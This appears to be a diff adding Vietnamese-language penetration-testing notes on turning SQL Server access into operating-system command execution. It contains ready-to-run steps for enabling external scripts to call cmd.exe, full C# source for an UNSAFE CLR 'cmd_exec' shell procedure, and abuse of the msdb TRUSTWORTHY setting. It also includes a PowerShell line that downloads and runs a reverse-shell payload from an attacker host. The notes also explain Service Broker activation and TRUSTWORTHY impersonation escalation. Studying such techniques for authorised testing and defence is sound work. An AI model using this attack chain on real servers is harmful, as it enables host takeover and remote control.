@@ -1,0 +1,293 @@
+- Tự add một stored procedure
+- CLR assembly
+- Machine leanrning service / external scripts
+- nâng quyền lên system
+
+
+* Machine leanrning service / external scripts
+-- check xem nó đã được bật chưa
+exec sp_configure 'external scripts enabled'
+
+-- bật nó
+exec sp_configure 'external scripts enabled', 1;
+RECONFIGURE;
+
+-- chạy
+exec sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("ipconfig"))'
+
+
+Điều kiện thành công:
+- Bật tính năng nâng cao "External Scripts"
+
+
+
+EXEC sp_execute_external_script @language=N'R', @script=N'OutputDataSet <- data.frame(system("cmd.exe /c ipconfig",intern=T))' WITH RESULT SETS (([cmd_out] text));
+
+EXEC sp_execute_external_script @language = N'R', @script = N'print("hello")'
+
+EXEC sp_execute_external_script @language = N'R', @script = N'system("cmd.exe /c whoami /all")'
+
+
+
+Khi gọi:
+
+EXEC sp_execute_external_script
+
+luồng thực thi là:
+
+SQL Server Engine
+      ↓
+SQL Server Launchpad
+      ↓
+Python/R runtime của SQL Server
+      ↓
+script execution
+
+
+
+Thay vào đó nó gọi runtime riêng của:
+
+SQL Server Machine Learning Services
+
+Runtime này được cài cùng SQL Server setup.
+
+
+
+C:\Program Files\Microsoft SQL Server\MSSQL15.INSTANCE\PYTHON_SERVICES\
+hoặc 
+...\R_SERVICES\
+
+
+
+Target không cần cài Python/R riêng,
+nhưng SQL Server phải được cài Machine Learning Services (Python/R runtime embedded)
+
+
+
+
+
+* clr assembly
+project , gõ "class library", chọn net framework build ra .dll ròi copy paste code 
+
+
+
+*******************************************************
+using System;
+using System.Data;
+using System.Data.SqlTypes;
+using Microsoft.SqlServer.Server;
+using System.Diagnostics;
+
+public partial class StoredProcedures
+{
+    [SqlProcedure]
+    public static void cmd_exec(SqlString execCommand)
+    {
+        if (execCommand.IsNull || string.IsNullOrWhiteSpace(execCommand.Value))
+        {
+            SqlContext.Pipe.Send("Error: Command is empty or null.");
+            return;
+        }
+
+        try
+        {
+            using (Process proc = new Process())
+            {
+                proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+                proc.StartInfo.Arguments = "/C " + execCommand.Value;
+                proc.StartInfo.UseShellExecute = false;
+                proc.StartInfo.RedirectStandardOutput = true;
+                proc.StartInfo.RedirectStandardError = true;
+                proc.StartInfo.CreateNoWindow = true;
+
+                proc.Start();
+
+                string output = proc.StandardOutput.ReadToEnd();
+                string error = proc.StandardError.ReadToEnd();
+
+                proc.WaitForExit();
+
+                // Trả kết quả về dưới dạng 1 cột result set
+                SqlMetaData[] metaData = new SqlMetaData[1];
+                metaData[0] = new SqlMetaData("output", SqlDbType.NVarChar, 4000);
+
+                SqlDataRecord record = new SqlDataRecord(metaData);
+
+                SqlContext.Pipe.SendResultsStart(record);
+                record.SetString(0, output + (string.IsNullOrEmpty(error) ? "" : "\nError: " + error));
+                SqlContext.Pipe.SendResultsRow(record);
+                SqlContext.Pipe.SendResultsEnd();
+            }
+        }
+        catch (Exception ex)
+        {
+            SqlContext.Pipe.Send("CLR Error: " + ex.Message);
+        }
+    }
+}
+*************************************************************************************
+
+-- check
+EXEC sp_configure 'clr enabled'
+hoặc
+SELECT name, value_in_use FROM sys.configurations WHERE name = 'clr enabled';
+
+
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'clr enabled', 1;
+RECONFIGURE;
+
+
+
+-- Bật thuộc tính TRUSTWORTHY trên database msdb
+-- Chuyển sang database msdb
+USE msdb;
+GO
+
+-- Bật TRUSTWORTHY
+ALTER DATABASE msdb SET TRUSTWORTHY ON;
+GO
+
+-- Kiểm tra lại
+SELECT name, is_trustworthy_on  FROM sys.databases WHERE name = 'msdb';
+
+
+-- Tạo Assembly từ file DLL (đã có sẵn trên server)
+USE msdb;
+GO
+
+-- Tạo Assembly với quyền UNSAFE
+CREATE ASSEMBLY shell FROM 'C:\temp\clr_assem.dll' WITH PERMISSION_SET = UNSAFE;
+GO
+
+-- Kiểm tra Assembly đã được tạo chưa
+SELECT * FROM sys.assemblies WHERE name = 'shell';
+
+
+
+
+-- Tạo Stored Procedure để gọi hàm trong DLL
+USE msdb;
+GO
+
+-- Tạo Procedure (tên procedure là cmd_exec)
+CREATE PROCEDURE [dbo].[cmd_exec]  @execCommand NVARCHAR(4000) AS EXTERNAL NAME [shell].[StoredProcedures].[cmd_exec];
+GO
+
+-- Kiểm tra Procedure đã tồn tại
+SELECT * FROM sys.procedures WHERE name = 'cmd_exec';
+
+
+
+
+-- Thực thi lệnh hệ điều hành (Command Execution)
+USE msdb;
+GO
+
+-- Thực thi các lệnh ví dụ
+EXEC cmd_exec 'whoami';
+EXEC cmd_exec 'ipconfig /all';
+EXEC cmd_exec 'hostname';
+EXEC cmd_exec 'net user';
+
+-- Ví dụ chạy PowerShell tải payload từ xa (reverse shell)
+EXEC cmd_exec 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/payload.ps1'')"';
+
+
+
+
+-- Dọn dẹp sau khi test
+USE msdb;
+GO
+
+-- Xóa Procedure trước
+DROP PROCEDURE IF EXISTS [dbo].[cmd_exec];
+GO
+
+-- Xóa Assembly sau
+DROP ASSEMBLY IF EXISTS [shell];
+GO
+
+
+
+
+
+
+************************
+Service Broker + activation trong Microsoft SQL Server là cơ chế:
+
+khi có message vào queue thì SQL Server tự động gọi một stored procedure để xử lý message đó
+
+
+Message gửi vào Queue
+        ↓
+Queue kích hoạt Activation Procedure
+        ↓
+Stored Procedure tự chạy
+
+
+
+App gửi message vào queue
+        ↓
+Queue nhận message
+        ↓
+Activation procedure tự chạy
+        ↓
+Procedure xử lý logic
+
+
+
+flow hoạt động
+SEND MESSAGE
+      ↓
+Message vào Queue
+      ↓
+Queue có activation enabled
+      ↓
+SQL Server tự gọi stored procedure
+      ↓
+Stored procedure RECEIVE message và xử lý
+
+
+
+********************************************************************
+1. TRUSTWORTHY là gì?
+TRUSTWORTHY (nghĩa là “đáng tin cậy”) là một thuộc tính ở mức database (không phải mức instance).
+Nó cho biết SQL Server có tin tưởng nội dung bên trong database đó hay không.
+
+Giá trị mặc định: OFF (đối với hầu hết các database khi tạo mới).
+Chỉ có thể thay đổi bằng lệnh ALTER DATABASE ... SET TRUSTWORTHY ON/OFF.
+Cần quyền sysadmin hoặc quyền CONTROL SERVER để bật/tắt thuộc tính này.
+
+Khi thuộc tính này được đặt là ON, SQL Server sẽ “tin tưởng” rằng mã và đối tượng bên trong database là an toàn, từ đó nới lỏng một số kiểm tra bảo mật.
+2. Tác dụng của TRUSTWORTHY trong ngữ cảnh CLR Assembly (Command Execution)
+Đây chính là lý do quan trọng nhất trong kỹ thuật pentesting mà chúng ta đã thảo luận:
+
+Để tạo và sử dụng CLR Assembly với quyền EXTERNAL_ACCESS hoặc UNSAFE, SQL Server yêu cầu một trong hai điều kiện sau:
+Database phải có TRUSTWORTHY = ON, và database owner phải có quyền UNSAFE ASSEMBLY (thường là sysadmin).
+Hoặc ký (sign) Assembly bằng certificate/asymmetric key và cấp quyền cho login tương ứng (cách làm an toàn hơn, được khuyến nghị).
+
+Khi TRUSTWORTHY = ON, bạn có thể tạo Assembly với PERMISSION_SET = UNSAFE mà không cần ký code.
+→ Điều này cho phép Assembly thực thi mã .NET có quyền cao: chạy lệnh hệ điều hành (cmd.exe, PowerShell), truy cập file system, network, registry, thậm chí inject code vào process của SQL Server.
+Nếu TRUSTWORTHY = OFF, lệnh CREATE ASSEMBLY ... WITH PERMISSION_SET = UNSAFE sẽ thất bại (lỗi authorization). Đây là cơ chế bảo vệ mặc định của SQL Server.
+
+Tóm lại trong ngữ cảnh CLR:
+TRUSTWORTHY là “chìa khóa” để chuyển Assembly từ chế độ an toàn (SAFE) sang chế độ nguy hiểm (UNSAFE), từ đó cho phép thực thi lệnh hệ thống từ bên trong SQL Server.
+3. TRUSTWORTHY còn tác dụng với những gì khác?
+Ngoài CLR, thuộc tính này ảnh hưởng đến nhiều tính năng khác liên quan đến impersonation (giả lập quyền người dùng) và truy cập cross-database/cross-instance:
+
+EXECUTE AS (Impersonation):
+Khi một stored procedure, function, hoặc trigger sử dụng WITH EXECUTE AS OWNER hoặc EXECUTE AS USER = 'someone', và TRUSTWORTHY = ON, thì quyền của người bị impersonate có thể “thoát ra” ngoài database hiện tại để truy cập:
+Các database khác trên cùng instance.
+Server-level permissions (ví dụ: quyền sysadmin, quyền tạo login, backup server…).
+
+Truy cập tài nguyên ngoài database (modules, linked servers, extended procedures…).
+Một số tính năng legacy hoặc đặc biệt:
+Database Mirroring / Availability Groups (cần TRUSTWORTHY ON ở một số trường hợp).
+Một số Job Agent hoặc Service Broker.
+
+
+Lưu ý: TRUSTWORTHY = ON cho phép code trong database “mang theo” quyền impersonated ra ngoài, thay vì bị giới hạn chỉ trong database đó.
+
